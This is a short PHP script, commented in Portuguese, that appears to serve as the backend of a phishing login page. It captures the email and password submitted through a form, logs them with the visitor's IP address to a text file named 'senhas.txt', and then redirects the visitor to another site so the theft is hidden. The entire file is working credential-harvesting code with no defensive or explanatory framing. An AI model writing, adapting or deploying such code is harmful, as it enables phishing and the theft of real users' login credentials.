<?php
$usr = $_POST['email']; // ID do formulário de login
$pswd = $_POST['senha']; // ID do formulário de senha
$ip = $_SERVER['REMOTE_ADDR'];
$all = "Email: ".$usr." - Senha: ".$pswd." - IP: ".$ip."<br>";
 
$fp = fopen("senhas.txt", "a");
fwrite($fp, $all);
fclose($fp);
header("Location: http://www.site.com"); // Redirecionamento
?>